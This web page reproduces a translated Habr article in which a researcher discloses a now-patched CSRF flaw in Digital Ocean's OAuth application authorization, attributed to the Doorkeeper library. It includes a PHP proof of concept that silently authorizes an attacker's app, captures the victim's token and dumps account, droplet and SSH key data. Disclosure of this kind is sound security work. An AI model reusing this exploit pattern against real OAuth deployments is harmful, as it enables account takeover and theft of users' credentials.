<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Grab full control over someone else's Digital Ocean cloud (Doorkeeper vulnerability)</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Like many habra users, I use "cloud" technologies, incl. I rent VPS (virtual servers) in different countries of the world. About two years, I used Ama...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Grab full control over someone else's Digital Ocean cloud (Doorkeeper vulnerability)</h1><div class="post__text post__text-html js-mediator-article">  Like many habra users, I use "cloud" technologies, incl.  I rent VPS (virtual servers) in different countries of the world.  About two years, I used Amazon and did not say that I was pleased, but enough. <br><br>  Last September, I came across a very aggressive PR campaign from Digital Ocean (DO) and decided to use their services.  From the moment I abandoned Amazon (never an advertisement) and completely switched to DO. <br><img src="https://habrastorage.org/getpro/habr/post_images/6a1/b01/d77/6a1b01d773bd770f01ac7e0b01078d75.png" alt="image"><br><br>  And the more you use any service and the more you trust your data to it, the more intently you watch how it works. <br><a name="habracut"></a><br>  Web DO is written in RoR, GO / Perl is also used everywhere, DB is MariaDB / PostgreSQL (it‚Äôs very strange that both are in one product, but oh well).  And from several security reports I would like to single out one already corrected, with the simplest bug and the biggest impact - the seizure of control over someone else's account. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h1>  Venue </h1><br>  Some time ago I wrote an article about the <a href="http://habrahabr.ru/company/dsec/blog/218829/">security of the API</a> and that it‚Äôs better to look at vulnerabilities there.  After inspecting your account and functionality, I noticed that it is there.  You can create "developer applications". <br><br><img src="https://habrastorage.org/files/4f4/45a/1ea/4f445a1ea8d44d18a6db74f9e7a2ddb0.png"><br>  <i>Application Creation Window</i> <br><br><h1>  Access through the application to the account </h1><br>  After reading the documents - <a href="https://developers.digitalocean.com/">developers.digitalocean.com</a> , having studied the launch of the new version of the API, I realized that I can create an application, I can get the following reference <a href="https%253A%252F%252Fsergeybelove.ru%252Fexploits%252F%26response_type%3Dcode">: % 2Fsergeybelove.ru% 2Fexploits% 2F &amp; response_type = code</a> <br><br><img src="https://habrastorage.org/files/45a/ca9/9e1/45aca99e1245479786d0cdc6cd5abf3b.png"><br>  <i>Sample Account Access Request</i> <br><br>  You can set the scope parameter in the url.  Instead of the typical solution of dividing rights across modules (for example, as in social networks - access to friends, photo albums, etc.), the guys from DO decided to do it differently, you can request the available operations ‚Äî read | write (without explicitly specifying the parameter read only), while giving access to all modules at once.  Far from the best solution. <br><br><h1>  Attack vector </h1><br>  If the user clicks on the ‚ÄúAuthorize Application‚Äù, it will automatically be transferred to the callback url with a special token.  This token can be used already on its side (the developer) to query the next token, which is needed directly for calls to the API methods themselves (account information, managing droplets, etc.). <br><br>  Their whole mistake was reduced to the fact that you can conduct a CSRF attack on the installation of the application (create on your side a form identical to the request above in the picture, change the action form to DO and execute submit).  CSRF token they use, but do not check on the server side. <br><br>  As a result, we simply place the necessary html / js code somewhere, put it in a hidden frame and, imperceptibly for the user, install its ‚Äúmalicious‚Äù application to it, simultaneously catching access_token, which the user sends via callback_url to our server. <br><br>  For clarity, I will bring my PoC.  When visiting a code with such a page, the application was installed, access_token was caught, the next was requested and some account data was displayed <br><br><pre><code class="php hljs">&lt;html&gt; &lt;body<span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_GET[<span class="hljs-string"><span class="hljs-string">'code'</span></span>])) <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">' onload="document.forms[0].submit()"'</span></span>; <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span>&gt; &lt;form action=<span class="hljs-string"><span class="hljs-string">"https://cloud.digitalocean.com/v1/oauth/authorize"</span></span> method=<span class="hljs-string"><span class="hljs-string">"POST"</span></span>&gt; &lt;input type=<span class="hljs-string"><span class="hljs-string">"hidden"</span></span> name=<span class="hljs-string"><span class="hljs-string">"utf8"</span></span> value=<span class="hljs-string"><span class="hljs-string">"√¢≈ì‚Äú"</span></span> /&gt; &lt;input type=<span class="hljs-string"><span class="hljs-string">"hidden"</span></span> name=<span class="hljs-string"><span class="hljs-string">"authenticity_token"</span></span> value=<span class="hljs-string"><span class="hljs-string">""</span></span> /&gt; &lt;input type=<span class="hljs-string"><span class="hljs-string">"hidden"</span></span> name=<span class="hljs-string"><span class="hljs-string">"client_id"</span></span> value=<span class="hljs-string"><span class="hljs-string">"___ID___FROM_DEV_PANEL__"</span></span> /&gt; &lt;input type=<span class="hljs-string"><span class="hljs-string">"hidden"</span></span> name=<span class="hljs-string"><span class="hljs-string">"redirect_uri"</span></span> value=<span class="hljs-string"><span class="hljs-string">"http://_url_with_exploit"</span></span> /&gt; &lt;input type=<span class="hljs-string"><span class="hljs-string">"hidden"</span></span> name=<span class="hljs-string"><span class="hljs-string">"state"</span></span> value=<span class="hljs-string"><span class="hljs-string">""</span></span> /&gt; &lt;input type=<span class="hljs-string"><span class="hljs-string">"hidden"</span></span> name=<span class="hljs-string"><span class="hljs-string">"response_type"</span></span> value=<span class="hljs-string"><span class="hljs-string">"code"</span></span> /&gt; &lt;input type=<span class="hljs-string"><span class="hljs-string">"hidden"</span></span> name=<span class="hljs-string"><span class="hljs-string">"scope"</span></span> value=<span class="hljs-string"><span class="hljs-string">"read write"</span></span> /&gt; &lt;input type=<span class="hljs-string"><span class="hljs-string">"hidden"</span></span> name=<span class="hljs-string"><span class="hljs-string">"commit"</span></span> value=<span class="hljs-string"><span class="hljs-string">"Authorize Application"</span></span> /&gt; &lt;input type=<span class="hljs-string"><span class="hljs-string">"submit"</span></span> value=<span class="hljs-string"><span class="hljs-string">"Submit request"</span></span> /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; <span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_GET[<span class="hljs-string"><span class="hljs-string">'code'</span></span>]) &amp;&amp; preg_match(<span class="hljs-string"><span class="hljs-string">"/^([a-z0-9]{64})$/"</span></span>, $_GET[<span class="hljs-string"><span class="hljs-string">'code'</span></span>])) { <span class="hljs-comment"><span class="hljs-comment">// lets exploit $resp = json_decode(shell_exec('curl -X POST "https://cloud.digitalocean.com/v1/oauth/token?grant_type=authorization_code&amp;code='.$_GET['code'].'&amp;client_id=_CLIENT_ID_OF_DEV_APP&amp;client_secret=CLIENT_SECRET_OF_DEV_API&amp;redirect_uri=http://_url_with_exploit"')); $token = $resp-&gt;access_token; echo "Your token is: ".$token; echo '&lt;h1&gt;User info:&lt;/h1&gt;&lt;pre&gt;'; print_r(json_decode(shell_exec('curl -X GET -H \'Content-Type: application/json\' -H \'Authorization: Bearer '.$token.'\' "https://api.digitalocean.com/v2/account"'))); echo '&lt;/pre&gt;&lt;h1&gt;Droplets info:&lt;/h1&gt;&lt;pre&gt;'; print_r(json_decode(shell_exec('curl -X GET -H \'Content-Type: application/json\' -H \'Authorization: Bearer '.$token.'\' "https://api.digitalocean.com/v2/droplets"'))); echo '&lt;/pre&gt;&lt;h1&gt;SSH keys info:&lt;/h1&gt;&lt;pre&gt;'; print_r(json_decode(shell_exec('curl -X GET -H \'Content-Type: application/json\' -H \'Authorization: Bearer '.$token.'\' "https://api.digitalocean.com//v2/account/keys"'))); echo '&lt;/pre&gt;'; }</span></span></code> </pre> <br><br>  The result - full control over the account.  Some of the available methods (just pointing scope = read, write): <br><br><ul><li>  Create, delete droplets </li><li>  Creating, deleting, updating ssh keys </li><li>  Moving images of droplets (to other accounts) </li></ul><br>  In general - thick.  This vulnerability is patched, the rest, unfortunately, no.  Maybe we can talk about them soon. <br><br>  upd: the vulnerability is not allowed by the DO developers, but is in the OAuth jam itself - the Doorkeeper, which is used on many sites. </div><p>Source: <a href="https://habr.com/ru/post/246025/">https://habr.com/ru/post/246025/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../246015/index.html">How performance tracking and billing can improve your OpenStack cloud performance</a></li>
<li><a href="../246017/index.html">Information objects or the reason for one misconception</a></li>
<li><a href="../246019/index.html">Single Page Application in Cloud Storage</a></li>
<li><a href="../246021/index.html">Install and configure CA Infrastructure Management. Part one. Performance management</a></li>
<li><a href="../246023/index.html">Mobile game on Unity. The first pancake ...</a></li>
<li><a href="../246027/index.html">A tale about how I disassembled Supaplex and almost wrote a clone with 3D graphics</a></li>
<li><a href="../246029/index.html">Dnipropetrovsk Ciklum Speakers' Corner with Igor Kryzhanovsky: UX is not UI. ‚ÄúThe Art of Washing the Elephant‚Äù, December 18</a></li>
<li><a href="../246031/index.html">More features with the new version of products DevExpress 14.2</a></li>
<li><a href="../246037/index.html">2 powerful psychological techniques for a significant increase in conversion</a></li>
<li><a href="../246039/index.html">Onto-engineer: from the creation of the world to the generation of entities</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>